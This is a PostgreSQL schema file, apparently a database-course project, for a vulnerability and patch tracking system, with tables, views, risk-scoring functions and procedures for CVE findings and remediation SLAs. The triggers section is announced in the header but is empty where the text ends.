-- ============================================================
-- Vulnerability and Patch Tracking System
-- PostgreSQL DDL Schema  v2.0
-- Pavlos Giannakis – NYU Principles of Database Systems
-- 15 Tables | 4 Views | 3 Stored Procedures | 4 Functions | 4 Triggers
-- ============================================================

-- ============================================================
-- TABLE 1: organizations
-- ============================================================
CREATE TABLE organizations (
    org_id              SERIAL PRIMARY KEY,
    org_name            VARCHAR(200) NOT NULL UNIQUE,
    industry            VARCHAR(100) NOT NULL,
    hq_country          CHAR(2) NOT NULL DEFAULT 'US',
    employee_count      INTEGER CHECK (employee_count > 0),
    revenue_tier        VARCHAR(20) CHECK (revenue_tier IN ('SMB','Mid-Market','Enterprise','Fortune500')),
    regulatory_scope    VARCHAR(300),        -- e.g. "PCI-DSS, HIPAA, SOC2"
    security_contact    VARCHAR(200),
    created_at          TIMESTAMP NOT NULL DEFAULT NOW(),
    updated_at          TIMESTAMP NOT NULL DEFAULT NOW()
);

-- ============================================================
-- TABLE 2: users
-- ============================================================
CREATE TABLE users (
    user_id             SERIAL PRIMARY KEY,
    org_id_fk           INTEGER NOT NULL REFERENCES organizations(org_id) ON DELETE CASCADE,
    username            VARCHAR(100) NOT NULL UNIQUE,
    full_name           VARCHAR(200) NOT NULL,
    email               VARCHAR(200) NOT NULL,
    department          VARCHAR(100),
    job_title           VARCHAR(100),
    role                VARCHAR(50) NOT NULL DEFAULT 'analyst'
                        CHECK (role IN ('admin','security_engineer','analyst','patch_manager','auditor','viewer')),
    mfa_enabled         BOOLEAN NOT NULL DEFAULT FALSE,
    last_login_at       TIMESTAMP,
    is_active           BOOLEAN NOT NULL DEFAULT TRUE,
    created_at          TIMESTAMP NOT NULL DEFAULT NOW()
);

-- ============================================================
-- TABLE 3: asset_groups
-- ============================================================
CREATE TABLE asset_groups (
    group_id            SERIAL PRIMARY KEY,
    org_id_fk           INTEGER NOT NULL REFERENCES organizations(org_id) ON DELETE CASCADE,
    group_name          VARCHAR(200) NOT NULL,
    group_type          VARCHAR(50) NOT NULL
                        CHECK (group_type IN ('Network Zone','Business Unit','Compliance Scope','Criticality Tier','Geographic')),
    description         TEXT,
    owner_id_fk         INTEGER REFERENCES users(user_id) ON DELETE SET NULL,
    created_at          TIMESTAMP NOT NULL DEFAULT NOW(),
    UNIQUE (org_id_fk, group_name)
);

-- ============================================================
-- TABLE 4: assets
-- ============================================================
CREATE TABLE assets (
    asset_id            SERIAL PRIMARY KEY,
    org_id_fk           INTEGER NOT NULL REFERENCES organizations(org_id) ON DELETE CASCADE,
    owner_id_fk         INTEGER REFERENCES users(user_id) ON DELETE SET NULL,
    hostname            VARCHAR(200) NOT NULL UNIQUE,
    fqdn                VARCHAR(300),
    ip_address          INET,
    mac_address         MACADDR,
    asset_type          VARCHAR(100) NOT NULL,
    operating_system    VARCHAR(150) NOT NULL,
    os_version          VARCHAR(80),
    cpu_count           SMALLINT CHECK (cpu_count > 0),
    ram_gb              NUMERIC(6,1) CHECK (ram_gb > 0),
    criticality         SMALLINT NOT NULL CHECK (criticality BETWEEN 1 AND 5),
    business_impact     TEXT,
    environment         VARCHAR(50) NOT NULL
                        CHECK (environment IN ('Production','Staging','Development','Corporate','Lab','DMZ')),
    network_zone        VARCHAR(100),
    is_active           BOOLEAN NOT NULL DEFAULT TRUE,
    last_seen_at        TIMESTAMP,
    notes               TEXT,
    created_at          TIMESTAMP NOT NULL DEFAULT NOW()
);

-- ============================================================
-- TABLE 5: asset_group_memberships  (junction: assets <-> asset_groups)
-- ============================================================
CREATE TABLE asset_group_memberships (
    membership_id       SERIAL PRIMARY KEY,
    asset_id_fk         INTEGER NOT NULL REFERENCES assets(asset_id) ON DELETE CASCADE,
    group_id_fk         INTEGER NOT NULL REFERENCES asset_groups(group_id) ON DELETE CASCADE,
    added_at            TIMESTAMP NOT NULL DEFAULT NOW(),
    added_by_fk         INTEGER REFERENCES users(user_id) ON DELETE SET NULL,
    UNIQUE (asset_id_fk, group_id_fk)
);

-- ============================================================
-- TABLE 6: scan_sources
-- ============================================================
CREATE TABLE scan_sources (
    source_id           SERIAL PRIMARY KEY,
    org_id_fk           INTEGER NOT NULL REFERENCES organizations(org_id) ON DELETE CASCADE,
    source_name         VARCHAR(150) NOT NULL,
    source_type         VARCHAR(80) NOT NULL
                        CHECK (source_type IN ('Vulnerability Scanner','EDR','SAST','DAST','Manual','Threat Intelligence','Cloud Security')),
    vendor              VARCHAR(100),
    product_version     VARCHAR(50),
    scan_frequency      VARCHAR(50),         -- e.g. 'Daily', 'Weekly', 'On-demand'
    last_scan_at        TIMESTAMP,
    is_active           BOOLEAN NOT NULL DEFAULT TRUE,
    api_endpoint        VARCHAR(500),
    UNIQUE (org_id_fk, source_name)
);

-- ============================================================
-- TABLE 7: software_products
-- ============================================================
CREATE TABLE software_products (
    software_id         SERIAL PRIMARY KEY,
    product_name        VARCHAR(200) NOT NULL,
    vendor              VARCHAR(200) NOT NULL,
    version             VARCHAR(80),
    product_type        VARCHAR(60) NOT NULL
                        CHECK (product_type IN ('Operating System','Application','Library','Middleware','Database','Network Device','Container Runtime','Cloud Service')),
    package_manager     VARCHAR(60),         -- apt, yum, pip, npm, etc.
    cpe_uri             VARCHAR(500),        -- CPE 2.3 formatted string
    end_of_life_date    DATE,
    is_supported        BOOLEAN NOT NULL DEFAULT TRUE,
    license_type        VARCHAR(100),
    UNIQUE (product_name, vendor, version)
);

-- ============================================================
-- TABLE 8: asset_software_installs  (junction: assets <-> software_products)
-- ============================================================
CREATE TABLE asset_software_installs (
    install_id          SERIAL PRIMARY KEY,
    asset_id_fk         INTEGER NOT NULL REFERENCES assets(asset_id) ON DELETE CASCADE,
    software_id_fk      INTEGER NOT NULL REFERENCES software_products(software_id) ON DELETE CASCADE,
    install_path        VARCHAR(500),
    install_date        DATE,
    detected_by         VARCHAR(50) NOT NULL DEFAULT 'scan'
                        CHECK (detected_by IN ('scan','agent','manual','SIEM')),
    is_authorized       BOOLEAN NOT NULL DEFAULT TRUE,
    first_detected_at   TIMESTAMP NOT NULL DEFAULT NOW(),
    UNIQUE (asset_id_fk, software_id_fk)
);

-- ============================================================
-- TABLE 9: vulnerabilities
-- ============================================================
CREATE TABLE vulnerabilities (
    vuln_id             SERIAL PRIMARY KEY,
    cve_id              VARCHAR(30) UNIQUE,
    cwe_id              VARCHAR(20),         -- e.g. CWE-79, CWE-89
    title               VARCHAR(400) NOT NULL,
    severity            VARCHAR(20) NOT NULL
                        CHECK (severity IN ('Critical','High','Medium','Low','Info')),
    cvss_score          NUMERIC(3,1) CHECK (cvss_score BETWEEN 0.0 AND 10.0),
    cvss_vector         VARCHAR(200),        -- AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    epss_score          NUMERIC(5,4) CHECK (epss_score BETWEEN 0 AND 1),  -- Exploit Prediction Scoring
    epss_percentile     NUMERIC(5,4) CHECK (epss_percentile BETWEEN 0 AND 1),
    attack_vector       VARCHAR(30)
                        CHECK (attack_vector IN ('Network','Adjacent','Local','Physical')),
    attack_complexity   VARCHAR(10) CHECK (attack_complexity IN ('Low','High')),
    privileges_required VARCHAR(10) CHECK (privileges_required IN ('None','Low','High')),
    user_interaction    VARCHAR(10) CHECK (user_interaction IN ('None','Required')),
    exploit_available   BOOLEAN NOT NULL DEFAULT FALSE,
    exploit_maturity    VARCHAR(30)
                        CHECK (exploit_maturity IN ('Not Defined','Unproven','Proof of Concept','Functional','High')),
    patch_available     BOOLEAN NOT NULL DEFAULT FALSE,
    published_date      DATE,
    last_modified_date  DATE,
    description         TEXT,
    references_urls     TEXT                 -- newline-separated advisory URLs
);

-- ============================================================
-- TABLE 10: software_vulnerabilities  (junction: software_products <-> vulnerabilities)
-- ============================================================
CREATE TABLE software_vulnerabilities (
    sw_vuln_id          SERIAL PRIMARY KEY,
    software_id_fk      INTEGER NOT NULL REFERENCES software_products(software_id) ON DELETE CASCADE,
    vuln_id_fk          INTEGER NOT NULL REFERENCES vulnerabilities(vuln_id) ON DELETE CASCADE,
    affected_version_range VARCHAR(200),     -- e.g. '< 2.17.0' or '2.0.0 - 2.14.1'
    fix_version         VARCHAR(80),
    patch_url           VARCHAR(500),
    vendor_advisory     VARCHAR(500),
    UNIQUE (software_id_fk, vuln_id_fk)
);

-- ============================================================
-- TABLE 11: remediation_sla_policies
-- ============================================================
CREATE TABLE remediation_sla_policies (
    policy_id           SERIAL PRIMARY KEY,
    org_id_fk           INTEGER NOT NULL REFERENCES organizations(org_id) ON DELETE CASCADE,
    policy_name         VARCHAR(200) NOT NULL,
    severity            VARCHAR(20) NOT NULL
                        CHECK (severity IN ('Critical','High','Medium','Low','Info')),
    max_days_to_remediate INTEGER NOT NULL CHECK (max_days_to_remediate > 0),
    escalation_days     INTEGER CHECK (escalation_days > 0),  -- days before SLA breach to escalate
    applies_to_env      VARCHAR(50),         -- NULL = all environments
    is_active           BOOLEAN NOT NULL DEFAULT TRUE,
    effective_date      DATE NOT NULL DEFAULT CURRENT_DATE,
    created_by_fk       INTEGER REFERENCES users(user_id) ON DELETE SET NULL,
    UNIQUE (org_id_fk, severity, applies_to_env)
);

-- ============================================================
-- TABLE 12: scan_findings
-- ============================================================
CREATE TABLE scan_findings (
    finding_id          SERIAL PRIMARY KEY,
    asset_id_fk         INTEGER NOT NULL REFERENCES assets(asset_id) ON DELETE CASCADE,
    sw_vuln_id_fk       INTEGER NOT NULL REFERENCES software_vulnerabilities(sw_vuln_id) ON DELETE CASCADE,
    scan_source_id_fk   INTEGER REFERENCES scan_sources(source_id) ON DELETE SET NULL,
    status              VARCHAR(40) NOT NULL DEFAULT 'Open'
                        CHECK (status IN ('Open','In Progress','Remediated','Accepted Risk','False Positive','Pending Retest')),
    risk_score          NUMERIC(7,2),        -- computed: cvss × epss × criticality
    sla_due_date        DATE,               -- auto-set by trigger from SLA policy
    discovered_at       TIMESTAMP NOT NULL DEFAULT NOW(),
    last_seen_at        TIMESTAMP NOT NULL DEFAULT NOW(),
    first_fixed_at      TIMESTAMP,
    evidence_snippet    TEXT,               -- scanner output or proof of vulnerability
    false_positive_reason TEXT,
    accepted_risk_reason TEXT,
    notes               TEXT,
    UNIQUE (asset_id_fk, sw_vuln_id_fk)
);

-- ============================================================
-- TABLE 13: patch_actions
-- ============================================================
CREATE TABLE patch_actions (
    action_id           SERIAL PRIMARY KEY,
    finding_id_fk       INTEGER NOT NULL REFERENCES scan_findings(finding_id) ON DELETE CASCADE,
    assigned_to_fk      INTEGER REFERENCES users(user_id) ON DELETE SET NULL,
    assigned_by_fk      INTEGER REFERENCES users(user_id) ON DELETE SET NULL,
    action_type         VARCHAR(60) NOT NULL DEFAULT 'Patch'
                        CHECK (action_type IN ('Patch','Configuration Change','Workaround','Accept Risk','Compensating Control','Mitigate','Remove Software')),
    status              VARCHAR(30) NOT NULL DEFAULT 'Pending'
                        CHECK (status IN ('Pending','In Progress','Awaiting Approval','Completed','Failed','Cancelled','Rolled Back')),
    priority            VARCHAR(20) NOT NULL DEFAULT 'Medium'
                        CHECK (priority IN ('Critical','High','Medium','Low')),
    due_date            DATE,
    started_at          TIMESTAMP,
    completed_at        TIMESTAMP,
    change_ticket_id    VARCHAR(100),        -- e.g. JIRA-1234, CHG0001234
    rollback_plan       TEXT,
    resolution_notes    TEXT,
    created_at          TIMESTAMP NOT NULL DEFAULT NOW()
);

-- ============================================================
-- TABLE 14: patch_status_history
-- ============================================================
CREATE TABLE patch_status_history (
    history_id          SERIAL PRIMARY KEY,
    action_id_fk        INTEGER NOT NULL REFERENCES patch_actions(action_id) ON DELETE CASCADE,
    old_status          VARCHAR(30),
    new_status          VARCHAR(30) NOT NULL,
    changed_by_fk       INTEGER REFERENCES users(user_id) ON DELETE SET NULL,
    changed_at          TIMESTAMP NOT NULL DEFAULT NOW(),
    change_reason       TEXT,
    automated           BOOLEAN NOT NULL DEFAULT FALSE   -- TRUE if changed by trigger/system
);

-- ============================================================
-- TABLE 15: risk_score_snapshots
-- ============================================================
CREATE TABLE risk_score_snapshots (
    snapshot_id         SERIAL PRIMARY KEY,
    asset_id_fk         INTEGER NOT NULL REFERENCES assets(asset_id) ON DELETE CASCADE,
    snapshot_date       DATE NOT NULL DEFAULT CURRENT_DATE,
    composite_score     NUMERIC(10,2) NOT NULL DEFAULT 0,
    open_findings_count INTEGER NOT NULL DEFAULT 0,
    critical_count      SMALLINT NOT NULL DEFAULT 0,
    high_count          SMALLINT NOT NULL DEFAULT 0,
    medium_count        SMALLINT NOT NULL DEFAULT 0,
    low_count           SMALLINT NOT NULL DEFAULT 0,
    exploit_active_count SMALLINT NOT NULL DEFAULT 0,
    sla_breached_count  SMALLINT NOT NULL DEFAULT 0,
    UNIQUE (asset_id_fk, snapshot_date)
);


-- ============================================================
-- VIEWS
-- ============================================================

-- View 1: Full asset exposure summary with SLA breach status
CREATE OR REPLACE VIEW vw_asset_exposure_summary AS
SELECT
    a.asset_id,
    a.hostname,
    a.fqdn,
    a.ip_address::TEXT,
    a.asset_type,
    a.operating_system,
    a.environment,
    a.network_zone,
    a.criticality,
    a.business_impact,
    o.org_name,
    u.full_name AS asset_owner,
    COUNT(sf.finding_id)                                          AS total_open_findings,
    COUNT(CASE WHEN v.severity = 'Critical' THEN 1 END)           AS critical_count,
    COUNT(CASE WHEN v.severity = 'High' THEN 1 END)               AS high_count,
    COUNT(CASE WHEN v.severity = 'Medium' THEN 1 END)             AS medium_count,
    COUNT(CASE WHEN v.severity = 'Low' THEN 1 END)                AS low_count,
    COUNT(CASE WHEN v.exploit_available = TRUE THEN 1 END)        AS exploitable_count,
    COUNT(CASE WHEN sf.sla_due_date < CURRENT_DATE
               AND sf.status NOT IN ('Remediated','Accepted Risk','False Positive') THEN 1 END) AS sla_breached_count,
    ROUND(COALESCE(MAX(sf.risk_score), 0), 2)                     AS max_risk_score,
    ROUND(COALESCE(SUM(sf.risk_score), 0), 2)                     AS total_risk_score
FROM assets a
JOIN organizations o ON a.org_id_fk = o.org_id
LEFT JOIN users u ON a.owner_id_fk = u.user_id
LEFT JOIN scan_findings sf ON a.asset_id = sf.asset_id_fk
    AND sf.status NOT IN ('Remediated','Accepted Risk','False Positive')
LEFT JOIN software_vulnerabilities sv ON sf.sw_vuln_id_fk = sv.sw_vuln_id
LEFT JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
GROUP BY a.asset_id, a.hostname, a.fqdn, a.ip_address, a.asset_type,
         a.operating_system, a.environment, a.network_zone, a.criticality,
         a.business_impact, o.org_name, u.full_name;


-- View 2: Patch compliance status with SLA breach intelligence
CREATE OR REPLACE VIEW vw_patch_compliance_status AS
SELECT
    pa.action_id,
    a.hostname,
    a.environment,
    a.criticality,
    v.cve_id,
    v.title                         AS vuln_title,
    v.severity,
    v.cvss_score,
    v.exploit_available,
    pa.action_type,
    pa.status                       AS action_status,
    pa.priority,
    pa.due_date,
    pa.change_ticket_id,
    pa.completed_at,
    u_assigned.full_name            AS assigned_to,
    u_by.full_name                  AS assigned_by,
    sf.status                       AS finding_status,
    sf.sla_due_date,
    sf.risk_score,
    CASE
        WHEN pa.status = 'Completed' THEN 'Compliant'
        WHEN sf.sla_due_date < CURRENT_DATE
             AND pa.status NOT IN ('Completed','Cancelled') THEN 'SLA Breached'
        WHEN sf.sla_due_date BETWEEN CURRENT_DATE AND CURRENT_DATE + 7
             AND pa.status NOT IN ('Completed','Cancelled') THEN 'At Risk'
        ELSE 'On Track'
    END                             AS compliance_state,
    CASE
        WHEN sf.sla_due_date IS NOT NULL
        THEN CURRENT_DATE - sf.sla_due_date
        ELSE NULL
    END                             AS days_past_sla
FROM patch_actions pa
JOIN scan_findings sf  ON pa.finding_id_fk = sf.finding_id
JOIN software_vulnerabilities sv ON sf.sw_vuln_id_fk = sv.sw_vuln_id
JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
JOIN assets a          ON sf.asset_id_fk = a.asset_id
LEFT JOIN users u_assigned ON pa.assigned_to_fk = u_assigned.user_id
LEFT JOIN users u_by       ON pa.assigned_by_fk = u_by.user_id;


-- View 3: High-priority exploitation risk dashboard
CREATE OR REPLACE VIEW vw_exploit_risk_dashboard AS
SELECT
    sf.finding_id,
    o.org_name,
    a.hostname,
    a.ip_address::TEXT,
    a.environment,
    a.criticality                   AS asset_criticality,
    v.cve_id,
    v.severity,
    v.cvss_score,
    v.epss_score,
    v.epss_percentile,
    v.attack_vector,
    v.exploit_maturity,
    v.patch_available,
    sf.risk_score,
    sf.sla_due_date,
    sf.discovered_at,
    sf.status                       AS finding_status,
    ss.source_name                  AS detected_by_tool,
    CASE
        WHEN sf.sla_due_date < CURRENT_DATE THEN 'OVERDUE'
        WHEN sf.sla_due_date <= CURRENT_DATE + 7 THEN 'DUE SOON'
        ELSE 'WITHIN SLA'
    END AS sla_urgency,
    CASE
        WHEN v.epss_score >= 0.5 AND v.exploit_available THEN 'IMMINENT'
        WHEN v.epss_score >= 0.2 OR v.exploit_available THEN 'ELEVATED'
        ELSE 'MONITORED'
    END AS exploitation_threat_level
FROM scan_findings sf
JOIN assets a ON sf.asset_id_fk = a.asset_id
JOIN organizations o ON a.org_id_fk = o.org_id
JOIN software_vulnerabilities sv ON sf.sw_vuln_id_fk = sv.sw_vuln_id
JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
LEFT JOIN scan_sources ss ON sf.scan_source_id_fk = ss.source_id
WHERE sf.status NOT IN ('Remediated','Accepted Risk','False Positive')
  AND (v.severity IN ('Critical','High') OR v.exploit_available = TRUE)
ORDER BY sf.risk_score DESC NULLS LAST;


-- View 4: Organization-level risk and compliance posture rollup
CREATE OR REPLACE VIEW vw_organization_risk_posture AS
SELECT
    o.org_id,
    o.org_name,
    o.industry,
    o.regulatory_scope,
    COUNT(DISTINCT a.asset_id)      AS total_assets,
    COUNT(DISTINCT sf.finding_id)   AS open_findings,
    COUNT(DISTINCT CASE WHEN v.severity = 'Critical' THEN sf.finding_id END)    AS critical_findings,
    COUNT(DISTINCT CASE WHEN v.exploit_available = TRUE THEN sf.finding_id END)  AS exploitable_findings,
    COUNT(DISTINCT CASE WHEN sf.sla_due_date < CURRENT_DATE
                        AND sf.status NOT IN ('Remediated','Accepted Risk','False Positive')
                        THEN sf.finding_id END)                                  AS sla_breached_findings,
    COUNT(DISTINCT pa.action_id)    AS total_patch_actions,
    COUNT(DISTINCT CASE WHEN pa.status = 'Completed' THEN pa.action_id END)     AS completed_actions,
    CASE
        WHEN COUNT(DISTINCT pa.action_id) > 0
        THEN ROUND(
            COUNT(DISTINCT CASE WHEN pa.status = 'Completed' THEN pa.action_id END)::NUMERIC
            / COUNT(DISTINCT pa.action_id) * 100, 1)
        ELSE 100.0
    END AS patch_compliance_pct,
    ROUND(COALESCE(SUM(sf.risk_score), 0), 0) AS aggregate_risk_score
FROM organizations o
LEFT JOIN assets a ON o.org_id = a.org_id_fk AND a.is_active = TRUE
LEFT JOIN scan_findings sf ON a.asset_id = sf.asset_id_fk
    AND sf.status NOT IN ('Remediated','Accepted Risk','False Positive')
LEFT JOIN software_vulnerabilities sv ON sf.sw_vuln_id_fk = sv.sw_vuln_id
LEFT JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
LEFT JOIN patch_actions pa ON sf.finding_id = pa.finding_id_fk
GROUP BY o.org_id, o.org_name, o.industry, o.regulatory_scope;


-- ============================================================
-- FUNCTIONS
-- ============================================================

-- Function 1: Calculate composite risk score for a single finding
-- Weights CVSS severity × EPSS exploitation probability × asset criticality
CREATE OR REPLACE FUNCTION fn_finding_risk_score(
    p_cvss_score    NUMERIC,
    p_epss_score    NUMERIC,
    p_criticality   INTEGER,
    p_exploit_avail BOOLEAN
) RETURNS NUMERIC AS $$
DECLARE
    base_score      NUMERIC;
    epss_multiplier NUMERIC;
    exploit_bonus   NUMERIC;
BEGIN
    -- Base: CVSS × asset criticality weight (criticality 5 = weight 2.0, 1 = weight 0.6)
    base_score := COALESCE(p_cvss_score, 5.0) * (0.4 + p_criticality * 0.32);

    -- EPSS multiplier: probability of exploitation in next 30 days (0.5 → 1.5x, 1.0 → 2.0x)
    epss_multiplier := 1.0 + COALESCE(p_epss_score, 0) * 1.5;

    -- Exploit bonus: +20% if known exploit exists
    exploit_bonus := CASE WHEN p_exploit_avail THEN 1.20 ELSE 1.0 END;

    RETURN ROUND(base_score * epss_multiplier * exploit_bonus, 2);
END;
$$ LANGUAGE plpgsql IMMUTABLE;


-- Function 2: Lookup SLA days remaining for a finding
CREATE OR REPLACE FUNCTION fn_sla_days_remaining(p_finding_id INTEGER)
RETURNS INTEGER AS $$
DECLARE
    due_date    DATE;
    finding_status VARCHAR(40);
BEGIN
    SELECT sf.sla_due_date, sf.status
    INTO due_date, finding_status
    FROM scan_findings sf
    WHERE sf.finding_id = p_finding_id;

    IF due_date IS NULL THEN RETURN NULL; END IF;
    IF finding_status IN ('Remediated','Accepted Risk','False Positive') THEN RETURN NULL; END IF;
    RETURN due_date - CURRENT_DATE;
END;
$$ LANGUAGE plpgsql;


-- Function 3: Return patch compliance rate for an organization
CREATE OR REPLACE FUNCTION fn_org_compliance_rate(p_org_id INTEGER)
RETURNS NUMERIC AS $$
DECLARE
    total_actions     INTEGER;
    completed_actions INTEGER;
BEGIN
    SELECT
        COUNT(*),
        COUNT(CASE WHEN pa.status = 'Completed' THEN 1 END)
    INTO total_actions, completed_actions
    FROM patch_actions pa
    JOIN scan_findings sf ON pa.finding_id_fk = sf.finding_id
    JOIN assets a ON sf.asset_id_fk = a.asset_id
    WHERE a.org_id_fk = p_org_id;

    IF total_actions = 0 THEN RETURN 100.0; END IF;
    RETURN ROUND((completed_actions::NUMERIC / total_actions) * 100, 1);
END;
$$ LANGUAGE plpgsql;


-- Function 4: Aggregate composite risk score for an entire asset
CREATE OR REPLACE FUNCTION fn_asset_composite_risk(p_asset_id INTEGER)
RETURNS NUMERIC AS $$
DECLARE
    total_score NUMERIC := 0;
    asset_crit  INTEGER;
BEGIN
    SELECT criticality INTO asset_crit FROM assets WHERE asset_id = p_asset_id;
    IF asset_crit IS NULL THEN RETURN 0; END IF;

    SELECT COALESCE(SUM(
        fn_finding_risk_score(v.cvss_score, v.epss_score, asset_crit, v.exploit_available)
    ), 0)
    INTO total_score
    FROM scan_findings sf
    JOIN software_vulnerabilities sv ON sf.sw_vuln_id_fk = sv.sw_vuln_id
    JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
    WHERE sf.asset_id_fk = p_asset_id
      AND sf.status NOT IN ('Remediated','Accepted Risk','False Positive');

    RETURN ROUND(total_score, 2);
END;
$$ LANGUAGE plpgsql;


-- ============================================================
-- STORED PROCEDURES
-- ============================================================

-- Procedure 1: Record a scan finding — deduplicates, computes risk score,
--              resolves SLA due date from org policy, prevents re-entry
CREATE OR REPLACE PROCEDURE sp_record_scan_finding(
    p_asset_id      INTEGER,
    p_sw_vuln_id    INTEGER,
    p_source_id     INTEGER DEFAULT NULL,
    p_evidence      TEXT    DEFAULT NULL,
    p_notes         TEXT    DEFAULT NULL
)
LANGUAGE plpgsql AS $$
DECLARE
    existing_id     INTEGER;
    v_cvss          NUMERIC;
    v_epss          NUMERIC;
    v_exploit       BOOLEAN;
    v_severity      VARCHAR(20);
    asset_crit      INTEGER;
    computed_score  NUMERIC;
    sla_days        INTEGER;
    due_date        DATE;
    org_id_val      INTEGER;
BEGIN
    -- Duplicate check: same asset + sw_vuln combo still open
    SELECT finding_id INTO existing_id
    FROM scan_findings
    WHERE asset_id_fk = p_asset_id AND sw_vuln_id_fk = p_sw_vuln_id
      AND status NOT IN ('Remediated','False Positive')
    LIMIT 1;

    IF existing_id IS NOT NULL THEN
        -- Refresh last_seen_at on the existing open finding
        UPDATE scan_findings SET last_seen_at = NOW() WHERE finding_id = existing_id;
        RAISE NOTICE 'Finding already tracked (finding_id=%). Updated last_seen_at.', existing_id;
        RETURN;
    END IF;

    -- Pull vulnerability metadata for scoring
    SELECT v.cvss_score, v.epss_score, v.exploit_available, v.severity
    INTO v_cvss, v_epss, v_exploit, v_severity
    FROM software_vulnerabilities sv
    JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
    WHERE sv.sw_vuln_id = p_sw_vuln_id;

    -- Pull asset criticality and org
    SELECT criticality, org_id_fk INTO asset_crit, org_id_val
    FROM assets WHERE asset_id = p_asset_id;

    -- Compute risk score
    computed_score := fn_finding_risk_score(v_cvss, v_epss, asset_crit, v_exploit);

    -- Resolve SLA due date from org remediation policy
    SELECT max_days_to_remediate INTO sla_days
    FROM remediation_sla_policies
    WHERE org_id_fk = org_id_val AND severity = v_severity AND is_active = TRUE
    LIMIT 1;

    due_date := CASE WHEN sla_days IS NOT NULL THEN CURRENT_DATE + sla_days ELSE NULL END;

    -- Insert the new finding
    INSERT INTO scan_findings (
        asset_id_fk, sw_vuln_id_fk, scan_source_id_fk,
        status, risk_score, sla_due_date, evidence_snippet, notes
    )
    VALUES (
        p_asset_id, p_sw_vuln_id, p_source_id,
        'Open', computed_score, due_date, p_evidence, p_notes
    );

    RAISE NOTICE 'New finding recorded. Risk score=%, SLA due=%', computed_score, due_date;
END;
$$;


-- Procedure 2: Initiate a patch action — validates finding is open,
--              derives priority from severity, creates action + initial history in one transaction
CREATE OR REPLACE PROCEDURE sp_initiate_patch_action(
    p_finding_id    INTEGER,
    p_assigned_to   INTEGER,
    p_assigned_by   INTEGER,
    p_action_type   VARCHAR(60) DEFAULT 'Patch',
    p_due_date      DATE        DEFAULT NULL,
    p_ticket_id     VARCHAR(100) DEFAULT NULL
)
LANGUAGE plpgsql AS $$
DECLARE
    finding_status  VARCHAR(40);
    v_severity      VARCHAR(20);
    v_priority      VARCHAR(20);
    new_action_id   INTEGER;
BEGIN
    -- Validate finding exists and is actionable
    SELECT sf.status, v.severity
    INTO finding_status, v_severity
    FROM scan_findings sf
    JOIN software_vulnerabilities sv ON sf.sw_vuln_id_fk = sv.sw_vuln_id
    JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
    WHERE sf.finding_id = p_finding_id;

    IF NOT FOUND THEN
        RAISE EXCEPTION 'Finding % does not exist', p_finding_id;
    END IF;

    IF finding_status IN ('Remediated','False Positive') THEN
        RAISE EXCEPTION 'Finding % is already % — cannot create patch action', p_finding_id, finding_status;
    END IF;

    -- Derive priority from vulnerability severity
    v_priority := CASE v_severity
        WHEN 'Critical' THEN 'Critical'
        WHEN 'High'     THEN 'High'
        WHEN 'Medium'   THEN 'Medium'
        ELSE 'Low'
    END;

    -- Create the patch action
    INSERT INTO patch_actions (
        finding_id_fk, assigned_to_fk, assigned_by_fk,
        action_type, status, priority, due_date, change_ticket_id
    )
    VALUES (
        p_finding_id, p_assigned_to, p_assigned_by,
        p_action_type, 'Pending', v_priority, p_due_date, p_ticket_id
    )
    RETURNING action_id INTO new_action_id;

    -- Initial history entry
    INSERT INTO patch_status_history (action_id_fk, old_status, new_status, changed_by_fk, change_reason, automated)
    VALUES (new_action_id, NULL, 'Pending', p_assigned_by, 'Patch action initiated by ' || p_assigned_by::TEXT, FALSE);

    -- Update finding to In Progress
    UPDATE scan_findings SET status = 'In Progress' WHERE finding_id = p_finding_id;

    RAISE NOTICE 'Patch action % created (priority=%, ticket=%)', new_action_id, v_priority, p_ticket_id;
END;
$$;


-- Procedure 3: Refresh risk score snapshot for an asset
CREATE OR REPLACE PROCEDURE sp_refresh_risk_snapshot(p_asset_id INTEGER)
LANGUAGE plpgsql AS $$
DECLARE
    v_score         NUMERIC;
    v_open          INTEGER;
    v_critical      SMALLINT;
    v_high          SMALLINT;
    v_medium        SMALLINT;
    v_low           SMALLINT;
    v_exploit       SMALLINT;
    v_sla_breach    SMALLINT;
BEGIN
    SELECT
        ROUND(COALESCE(SUM(fn_finding_risk_score(v.cvss_score, v.epss_score, a.criticality, v.exploit_available)), 0), 2),
        COUNT(sf.finding_id)::INTEGER,
        COUNT(CASE WHEN v.severity = 'Critical' THEN 1 END)::SMALLINT,
        COUNT(CASE WHEN v.severity = 'High'     THEN 1 END)::SMALLINT,
        COUNT(CASE WHEN v.severity = 'Medium'   THEN 1 END)::SMALLINT,
        COUNT(CASE WHEN v.severity = 'Low'      THEN 1 END)::SMALLINT,
        COUNT(CASE WHEN v.exploit_available = TRUE THEN 1 END)::SMALLINT,
        COUNT(CASE WHEN sf.sla_due_date < CURRENT_DATE
                        AND sf.status NOT IN ('Remediated','Accepted Risk','False Positive')
                   THEN 1 END)::SMALLINT
    INTO v_score, v_open, v_critical, v_high, v_medium, v_low, v_exploit, v_sla_breach
    FROM scan_findings sf
    JOIN software_vulnerabilities sv ON sf.sw_vuln_id_fk = sv.sw_vuln_id
    JOIN vulnerabilities v ON sv.vuln_id_fk = v.vuln_id
    JOIN assets a ON sf.asset_id_fk = a.asset_id
    WHERE sf.asset_id_fk = p_asset_id
      AND sf.status NOT IN ('Remediated','Accepted Risk','False Positive');

    INSERT INTO risk_score_snapshots (
        asset_id_fk, snapshot_date, composite_score, open_findings_count,
        critical_count, high_count, medium_count, low_count, exploit_active_count, sla_breached_count
    )
    VALUES (
        p_asset_id, CURRENT_DATE, v_score, v_open,
        v_critical, v_high, v_medium, v_low, v_exploit, v_sla_breach
    )
    ON CONFLICT (asset_id_fk, snapshot_date)
    DO UPDATE SET
        composite_score     = EXCLUDED.composite_score,
        open_findings_count = EXCLUDED.open_findings_count,
        critical_count      = EXCLUDED.critical_count,
        high_count          = EXCLUDED.high_count,
        medium_count        = EXCLUDED.medium_count,
        low_count           = EXCLUDED.low_count,
        exploit_active_count = EXCLUDED.exploit_active_count,
        sla_breached_count  = EXCLUDED.sla_breached_count;
END;
$$;


-- ============================================================
-- TRIGGERS
-- ============================================================

